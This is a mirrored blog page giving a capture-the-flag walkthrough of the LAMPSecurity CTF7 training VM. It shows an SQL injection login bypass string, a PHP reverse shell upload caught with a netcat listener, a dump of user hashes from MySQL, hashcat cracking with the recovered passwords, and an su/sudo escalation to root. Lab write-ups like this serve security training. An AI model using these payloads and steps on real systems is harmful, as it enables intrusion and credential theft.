@@ -1,0 +1,674 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/lamp-security-ctf7-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="https://highon.coffee/cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>LAMP Security CTF7 - Walkthrough</title>
+<meta name="description" content="LAMP Security CTF 7 - Walkthrough Guide">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900">
+<link rel="stylesheet" type="text/css" href="https://highon.coffee/css/screen.css">
+<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="https://highon.coffee/img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+LAMP Security CTF7 - Walkthrough
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+walkthroughs
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+02 Apr 2014
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<div class="coffee-rating">
+<table>
+<tbody>
+<tr>
+<td>
+<p><code>Coffee Difficulty Rating:</code></p>
+</td>
+<td>
+<p><i class="fa fa-coffee"></i></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul id="markdown-toc">
+<li><a href="#author-description" id="markdown-toc-author-description">Author Description</a></li>
+<li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a> <ul>
+<li><a href="#host-service-enumeration" id="markdown-toc-host-service-enumeration">Host Service Enumeration</a></li>
+</ul>
+</li>
+<li><a href="#web-application-enumeration" id="markdown-toc-web-application-enumeration">Web Application Enumeration</a></li>
+<li><a href="#web-application-on-port-8080" id="markdown-toc-web-application-on-port-8080">Web Application on Port 8080</a> <ul>
+<li><a href="#php-shell-upload" id="markdown-toc-php-shell-upload">PHP Shell Upload</a></li>
+<li><a href="#dirbuster" id="markdown-toc-dirbuster">Dirbuster</a></li>
+<li><a href="#reverse-shell" id="markdown-toc-reverse-shell">Reverse Shell</a></li>
+</ul>
+</li>
+<li><a href="#local-enumeration" id="markdown-toc-local-enumeration">Local Enumeration</a> <ul>
+<li><a href="#mysql" id="markdown-toc-mysql">MySQL</a></li>
+<li><a href="#hashcat-md5-cracking" id="markdown-toc-hashcat-md5-cracking">Hashcat md5 cracking</a> <ul>
+<li><a href="#cracked-md5-hashes" id="markdown-toc-cracked-md5-hashes">Cracked MD5 Hashes</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#local-privilege-escalation" id="markdown-toc-local-privilege-escalation">Local Privilege Escalation</a></li>
+</ul>
+<h2 id="author-description">Author Description</h2>
+<p>The LAMPSecurity project is an effort to produce training and benchmarking
+tools that can be used to educate information security professionals and test
+products.</p>
+<p><strong>Author:</strong> madirish2600</p>
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/">VulnHub</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -v -p 1-65535 -sV -O -sT 192.168.30.134</code></pre></figure>
+<div class="note info">
+<h5>Dislcaimer: Multiple Entry Points</h5>
+<p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p>
+</div>
+<h3 id="host-service-enumeration">Host Service Enumeration</h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>TCP: 22</code></p></pc>
+</td>
+<td>
+<pc><p>SSH</p></pc>
+</td>
+<td>
+<pc><p>OpenSSH 5.3 (protocol 2.0)</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 80</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.15 ((CentOS))</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 139</code></p></pc>
+</td>
+<td>
+<pc><p>Samba</p></pc>
+</td>
+<td>
+<pc><p>Samba smbd 3.X (workgroup: MYGROUP)</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 901</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Samba SWAT administration server</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 8080</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.15 ((CentOS))</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 10000</code></p></pc>
+</td>
+<td>
+<pc><p>Webmin</p></pc>
+</td>
+<td>
+<pc><p>(Webmin httpd)</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="web-application-enumeration">Web Application Enumeration</h2>
+<p>Host enumeration discovered two web application, one on port <code>80</code> and one on port
+<code>8080</code>, as with the previous CTF series VM’s, other entry points are
+ignored and the <strong>web application</strong> is used for the entry point.</p>
+<h2 id="web-application-on-port-8080">Web Application on Port 8080</h2>
+<p>Inspection of the web application revealed it’s vulnerable to an SQLi
+authentication bypass. By Entering <code>' or 1=1 -- .</code> in the username
+field an attacker can successfully login as admin.</p>
+<p><img src="https://highon.coffee/img/blog/ctf7/sqli.png" alt="SQL Injection Auth Bypass" /></p>
+<p>Admin account:</p>
+<p><img src="https://highon.coffee/img/blog/ctf7/admin-login.png" alt="Admin Account SQLi" /></p>
+<h3 id="php-shell-upload">PHP Shell Upload</h3>
+<p>With admin access to the web application it was possible to upload a reverse
+shell.</p>
+<p><img src="https://highon.coffee/img/blog/ctf7/upload-shell.png" alt="Reverse PHP Shell" /></p>
+<p>Execution of the php shell was not possible via the web application directly.</p>
+<h3 id="dirbuster">Dirbuster</h3>
+<p>Dirbuster disclosed the location of the file uploads directory
+<code>/assets/</code>.</p>
+<p><img src="https://highon.coffee/img/blog/ctf7/dirbuster.png" alt="OWASP Dirbuster" /></p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p><img src="https://highon.coffee/img/blog/ctf7/exec-webshell.png" alt="Execute Reverse Shell" /></p>
+<p>Executing the php script resulted in a reverse shell as the user apache:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">[root:~]# </span>nc -n -v -l -p 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.221.134] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.221.133] 58599
+Linux localhost.localdomain 2.6.32-279.el6.i686 <span class="c">#1 SMP Fri Jun 22 10:59:55 UTC</span>
+2012 i686 i686 i386 GNU/Linux
+01:12:47 up  2:37,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5814171f111618">[email&#160;protected]</a>   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+<span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
+sh: no job control <span class="k">in </span>this shell
+sh-4.1<span class="err">$</span></code></pre></figure>
+<h2 id="local-enumeration">Local Enumeration</h2>
+<p>Local enumeration discovered mysql root account could be accessed locally
+without a password:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mysql -u root  and no password worked as the apache user.</code></pre></figure>
+<h3 id="mysql">MySQL</h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">mysql&gt; </span><span class="k">select </span>username, password from users;
+<span class="k">select </span>username, password from users;
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
+| username
+| password                         |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a9cbdbc0c8c7e9c5c6cac8c5c1c6dadd87c5c6cac8c5cdc6c4c8c0c7">[email&#160;protected]</a>
+| 4cb9c8a8048fd02294477fcb1a41191a |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d8b2b7b0b698b4b7bbb9b4b0b7abacf6b4b7bbb9b4bcb7b5b9b1b6">[email&#160;protected]</a>
+| 0d9ff2a4396d6939f80ffe09b1280ee1 |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="73121f1a1016331f1c10121f1b1c00075d1f1c10121f171c1e121a1d">[email&#160;protected]</a>
+| 2146bf95e8929874fc63d54f50f1d2e3 |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="deacabbca79eb2b1bdbfb2b6b1adaaf0b2b1bdbfb2bab1b3bfb7b0">[email&#160;protected]</a>
+| 9f80ec37f8313728ef3e2f218c79aa23 |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b9d5dcd6d7f9d5d6dad8d5d1d6cacd97d5d6dad8d5ddd6d4d8d0d7">[email&#160;protected]</a>
+| 5d93ceb70e2bf5daa84ec3d0cd2c731a |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="38524d5451597854575b595450574b4c1654575b59545c5755595156">[email&#160;protected]</a>
+| ed2539fe892d2c52c42a440354e8e3d5 |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="55383c363d34303915393a3634393d3a26217b393a363439313a38343c3b">[email&#160;protected]</a>
+| 9c42a1346e333a770904b2a2b37fa7d3 |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="503222253335103c3f33313c383f23247e3c3f33313c343f3d31393e">[email&#160;protected]</a>
+| 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
+| <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5e303b37321e32313d3f3236312d2a7032313d3f323a31333f3730">[email&#160;protected]</a>
+| 4773408d5358875b3764db552a29ca61 |</code></pre></figure>
+<h3 id="hashcat-md5-cracking">Hashcat md5 cracking</h3>
+<p>The hashes were placed in a text file using the following format:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3755455e5659775b5854565b5f584443195b5854565b53585a565e59">[email&#160;protected]</a>:4cb9c8a8048fd02294477fcb1a41191a
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="afc5c0c7c1efc3c0cccec3c7c0dcdb81c3c0cccec3cbc0c2cec6c1">[email&#160;protected]</a>:0d9ff2a4396d6939f80ffe09b1280ee1
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d0b1bcb9b3b590bcbfb3b1bcb8bfa3a4febcbfb3b1bcb4bfbdb1b9be">[email&#160;protected]</a>:2146bf95e8929874fc63d54f50f1d2e3
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cbb9bea9b28ba7a4a8aaa7a3a4b8bfe5a7a4a8aaa7afa4a6aaa2a5">[email&#160;protected]</a>:9f80ec37f8313728ef3e2f218c79aa23
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5b373e34351b3734383a373334282f753734383a373f34363a3235">[email&#160;protected]</a>:5d93ceb70e2bf5daa84ec3d0cd2c731a
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6a001f06030b2a0605090b060205191e440605090b060e05070b0304">[email&#160;protected]</a>:ed2539fe892d2c52c42a440354e8e3d5
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8ce1e5efe4ede9e0cce0e3efede0e4e3fff8a2e0e3efede0e8e3e1ede5">[email&#160;protected]</a>:9c42a1346e333a770904b2a2b37fa7d3
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f29080879197b29e9d91939e9a9d8186dc9e9d91939e969d9f939b">[email&#160;protected]</a>:3a24d81c2b9d0d9aaf2f10c6c9757d4e
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acc2c9c5c0ecc0c3cfcdc0c4c3dfd882c0c3cfcdc0c8c3c1cdc5c2">[email&#160;protected]</a>:4773408d5358875b3764db552a29ca61
+<a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2b48434a59474e586b4744484a474344585f054744484a474f44464a42">[email&#160;protected]</a>:b2a97bcecbd9336b98d59d9324dae5cf</code></pre></figure>
+<p>NOTE: In order for hashcat to ignore usernames in a hash input file you need to
+specify <code>--username </code></p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">[root:~]# </span>hashcat --username -m 0 -a 0 crack-ctf7.txt
+/usr/share/wordlists/rockyou.txt</code></pre></figure>
+<h4 id="cracked-md5-hashes">Cracked MD5 Hashes</h4>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ed2539fe892d2c52c42a440354e8e3d5:madrid
+4cb9c8a8048fd02294477fcb1a41191a:changeme
+5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234
+2146bf95e8929874fc63d54f50f1d2e3:turtles77
+9c42a1346e333a770904b2a2b37fa7d3:somepassword
+b2a97bcecbd9336b98d59d9324dae5cf:chuck33</code></pre></figure>
+<h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
+<p>The julia account was able to <code>su</code> to root.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">bash-4.1$ </span>su - julia
+su - julia
+Password: madrid
+
+<span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="39534c5550587955565a585551564a4d">[email&#160;protected]</a> ~]<span class="nv">$ </span>sudo -s
+sudo -s
+<span class="o">[</span>sudo] password <span class="k">for </span>julia: madrid
+
+<span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="196b76766d5975767a787571766a6d">[email&#160;protected]</a> julia]# id
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
+<span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7d0f1212093d11121e1c1115120e09">[email&#160;protected]</a> julia]#</code></pre></figure>
+<p>Thanks for the VM :)</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=LAMP%20Security%20CTF7%20-%20Walkthrough&amp;url=https://highon.coffee/blog/lamp-security-ctf7-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/lamp-security-ctf7-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/lamp-security-ctf7-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/lamp-security-ctf7-walkthrough/&amp;title=LAMP%20Security%20CTF7%20-%20Walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sleepy-ctf-walkthrough/index.html">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../pipe-ctf-walkthrough/index.html">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../index.html">All Blog</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a>
+ </li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+</li>
+
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="https://highon.coffee/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="https://highon.coffee/cdn-cgi/scripts/ddc5a536/cloudflare-static/email-decode.min.js"></script><script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
